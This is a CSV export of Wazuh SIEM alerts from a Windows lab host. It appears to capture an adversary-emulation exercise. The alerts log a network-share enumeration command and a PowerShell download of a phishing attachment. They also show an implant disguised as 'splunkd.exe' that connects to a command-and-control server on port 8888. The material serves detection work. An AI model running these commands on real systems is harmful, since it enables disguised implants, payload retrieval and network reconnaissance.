wazuh-alerts-4.x-2024.12.10,9vRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,3,FALSE,7,Host-based anomaly detection event (rootcheck).,"[""ossec"",""rootcheck""]",510,rootcheck,log,"Dec 10, 2024 @ 17:48:03.058",rootcheck,1733852883,"Dec 10, 2024 @ 17:48:03.058", , , ,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,/root/.npm/_cacache/index-v5/82/d7/dcbd0725f9366f2f85f22b083393726197ae5e3c24aab76e6921106117ff,File is owned by root and has written permissions to anyone.,File '/root/.npm/_cacache/index-v5/82/d7/dcbd0725f9366f2f85f22b083393726197ae5e3c24aab76e6921106117ff' is owned by root and has written permissions to anyone., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,9_RRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:47:58.610
ProcessGuid: {15959494-7ece-6758-9d02-000000000300}
ProcessId: 8368
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_tiuh44gt.svu.ps1
CreationUtcTime: 2024-12-10 17:47:58.610
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:47:58.6221305Z,9095,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,1,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:05.749",EventChannel,1733852885,"Dec 10, 2024 @ 17:48:05.749", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7ece-6758-9d02-000000000300},8368,47:58.6, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_tiuh44gt.svu.ps1,47:58.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,'-PRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,7,Listened ports status (netstat) changed (new port opened or closed).,"[""ossec""]",533,ossec,log,"Dec 10, 2024 @ 17:48:06.292",netstat listening ports,1733852886,"Dec 10, 2024 @ 17:48:06.292", , , ,"[""IV_35.7.d""]","[""10.1""]", , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.2.7"",""10.6.1""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.14"",""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,"Previous output:
ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 245/node
tcp 0.0.0.0:1514 0.0.0.0:* 6109/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 5788/wazuh-authd
tcp 172.31.234.82:2222 0.0.0.0:* 984/python3
tcp 172.31.234.82:7010 0.0.0.0:* 984/python3
udp 172.31.234.82:7011 0.0.0.0:* 984/python3
tcp 172.31.234.82:7012 0.0.0.0:* 984/python3
tcp 172.31.234.82:8022 0.0.0.0:* 984/python3
udp 172.31.234.82:8853 0.0.0.0:* 984/python3
tcp 172.31.234.82:8888 0.0.0.0:* 984/python3
tcp 0.0.0.0:55000 0.0.0.0:* 5739/python3", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,"ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 8148/node
tcp 0.0.0.0:1514 0.0.0.0:* 9485/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 9164/wazuh-authd
tcp 172.31.234.82:2222 0.0.0.0:* 984/python3
tcp 172.31.234.82:7010 0.0.0.0:* 984/python3
udp 172.31.234.82:7011 0.0.0.0:* 984/python3
tcp 172.31.234.82:7012 0.0.0.0:* 984/python3
tcp 172.31.234.82:8022 0.0.0.0:* 984/python3
udp 172.31.234.82:8853 0.0.0.0:* 984/python3
tcp 172.31.234.82:8888 0.0.0.0:* 984/python3
tcp 0.0.0.0:55000 0.0.0.0:* 9115/python3", , , , , , , , , , , ,"ossec: output: 'netstat listening ports':
udp6       0      0 ::1:323                 :::*                                -                   
tcp        0      0 10.255.255.254:53       0.0.0.0:*               LISTEN      -                   
udp        0      0 10.255.255.254:53       0.0.0.0:*                           -                   
tcp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp 127.0.0.53:53 0.0.0.0:* 271/systemd-resolve
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
tcp 0.0.0.0:443 0.0.0.0:* 245/node
tcp 0.0.0.0:1514 0.0.0.0:* 6109/wazuh-remoted
tcp 0.0.0.0:1515 0.0.0.0:* 5788/wazuh-authd
tcp 172.31.234.82:2222 0.0.0.0:* 984/python3
tcp 172.31.234.82:7010 0.0.0.0:* 984/python3
udp 172.31.234.82:7011 0.0.0.0:* 984/python3
tcp 172.31.234.82:7012 0.0.0.0:* 984/python3
tcp 172.31.234.82:8022 0.0.0.0:* 984/python3
udp 172.31.234.82:8853 0.0.0.0:* 984/python3
tcp 172.31.234.82:8888 0.0.0.0:* 984/python3
tcp 0.0.0.0:55000 0.0.0.0:* 5739/python3", , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,'-fRRspMBtNh2X6vnUt-U,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 17:47:59.821
ProcessGuid: {15959494-7ecf-6758-aa02-000000000300}
ProcessId: 5384
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\WINDOWS\system32\cmd.exe"" /c PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe /ldap:all
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7ece-6758-9d02-000000000300}
ParentProcessId: 8368
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""cmd /c 'PathToAtomicsFolder\..\ExternalPayloads\SharpShares.exe' /ldap:all | out-file -filepath \""$env:temp\T1135SharpSharesOutput.txt\""""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:47:59.8338608Z,9125,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,4,Powershell process spawned Windows command shell instance,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92004,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:06.470",EventChannel,1733852886,"Dec 10, 2024 @ 17:48:06.470", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7ecf-6758-aa02-000000000300},5384,47:59.8,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7ece-6758-9d02-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"powershell.exe -ExecutionPolicy Bypass -C \""cmd /c 'PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe' /ldap:all | out-file -filepath \\\""$env:temp\\T1135SharpSharesOutput.txt\\\""\""",0xeacdd,8368,C:\\Users\\mari\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\WINDOWS\\system32\\cmd.exe\"" /c PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe /ldap:all",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,'-vRRspMBtNh2X6vnUt-V,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:48:06.903
ProcessGuid: {15959494-7ed3-6758-ab02-000000000300}
ProcessId: 9136
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_rpfclhtz.oz3.ps1
CreationUtcTime: 2024-12-10 17:48:06.903
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:48:06.9303891Z,9139,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,2,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:08.057",EventChannel,1733852888,"Dec 10, 2024 @ 17:48:08.057", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7ed3-6758-ab02-000000000300},9136,48:06.9, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_rpfclhtz.oz3.ps1,48:06.9, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,'-_RRspMBtNh2X6vnUt-V,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,3,Wazuh server started.,"[""ossec""]",502,ossec,log,"Dec 10, 2024 @ 17:48:15.290",wazuh-monitord,1733852895,"Dec 10, 2024 @ 17:48:15.290", , , ,"[""IV_35.7.d""]","[""10.1""]", , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]","[""164.312.b""]","[""CC7.2"",""CC7.3""]","[""AU.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,ossec: Manager started., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,_PRRspMBtNh2X6vnUt-V,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,16384,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-11T17:33:19Z. Reason: RulesEngine.""",0,2024-12-10T17:48:20.3798128Z,393,0,DESKTOP-QGB4EQH,0,0,INFORMATION,Microsoft-Windows-Security-SPP,1,FALSE,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:20.191",EventChannel,1733852900,"Dec 10, 2024 @ 17:48:20.191","2024-12-11T17:33:19Z, RulesEngine", ,Software Protection Platform Service, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,AfRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:48:45.343
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\C4W3GX6O\experiences_weather-info-card_dist_hidepopup_ContextualFeedback_helper_js-libs_fundamentals_d-8bacb9.df5ac5841199a7b28330[1].js
CreationUtcTime: 2024-12-10 17:48:45.343
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:48:45.7179641Z,9176,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,2,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:48:46.499",EventChannel,1733852926,"Dec 10, 2024 @ 17:48:46.499", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,48:45.3, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\C4W3GX6O\\experiences_weather-info-card_dist_hidepopup_ContextualFeedback_helper_js-libs_fundamentals_d-8bacb9.df5ac5841199a7b28330[1].js,48:45.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,BfRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-12-10 17:49:06.638
ProcessGuid: {15959494-7f12-6758-bb02-000000000300}
ProcessId: 7432
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm""
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:49:06.6402227Z,9185,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021,windows_eventchannel,log,"Dec 10, 2024 @ 17:49:07.411",EventChannel,1733852947,"Dec 10, 2024 @ 17:49:07.411", , , , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-7f12-6758-bb02-000000000300},7432,49:06.6,"SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.19041.3996 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\""",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,BvRRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:49:06.844
ProcessGuid: {15959494-7f12-6758-bb02-000000000300}
ProcessId: 7432
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_3443hepg.otf.ps1
CreationUtcTime: 2024-12-10 17:49:06.844
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:49:06.8565787Z,9193,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,3,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:49:07.533",EventChannel,1733852947,"Dec 10, 2024 @ 17:49:07.533", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7f12-6758-bb02-000000000300},7432,49:06.8, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_3443hepg.otf.ps1,49:06.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,B_RRspMBtNh2X6vnUuCV,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:50:10.769
ProcessGuid: {15959494-7f52-6758-c802-000000000300}
ProcessId: 3192
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_zkl0ji1p.aki.ps1
CreationUtcTime: 2024-12-10 17:50:10.769
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:50:10.7813887Z,9241,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,4,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:50:11.786",EventChannel,1733853011,"Dec 10, 2024 @ 17:50:11.786", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7f52-6758-c802-000000000300},3192,50:10.8, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zkl0ji1p.aki.ps1,50:10.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
